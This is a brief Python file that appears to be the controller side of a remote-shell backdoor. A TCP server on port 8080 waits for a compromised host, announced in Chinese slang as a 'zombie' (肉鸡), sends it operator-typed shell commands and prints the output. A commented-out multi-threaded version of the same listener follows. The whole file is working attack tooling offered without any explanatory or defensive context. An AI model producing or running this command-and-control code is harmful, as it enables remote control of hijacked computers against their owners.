from socket import socket


def main():
    with socket() as tcp_socket:
        tcp_socket.bind(('', 8080))
        tcp_socket.listen()
        client_socket, client_addr = tcp_socket.accept()
        with client_socket:
            print(f"[肉鸡{client_addr}已经上线：]\n")
            while True:
                cmd = input("$ ")
                client_socket.send(cmd.encode("utf-8"))
                data = client_socket.recv(2048)
                if data:
                    print(data.decode("utf-8"))


if __name__ == "__main__":
    main()

# from socketserver import ThreadingTCPServer, BaseRequestHandler

# class MyHandler(BaseRequestHandler):
#     def handle(self):
#         print(f"[肉鸡{self.client_address}已经上线：]\n")
#         while True:
#             cmd = input("$ ")
#             self.request.send(cmd.encode("utf-8"))
#             data = self.request.recv(2048)
#             # if data:
#             print(data.decode("utf-8"))

# if __name__ == "__main__":
#     ThreadingTCPServer.allow_reuse_address = True
#     with ThreadingTCPServer(('', 8080), MyHandler) as server:
#         server.serve_forever()
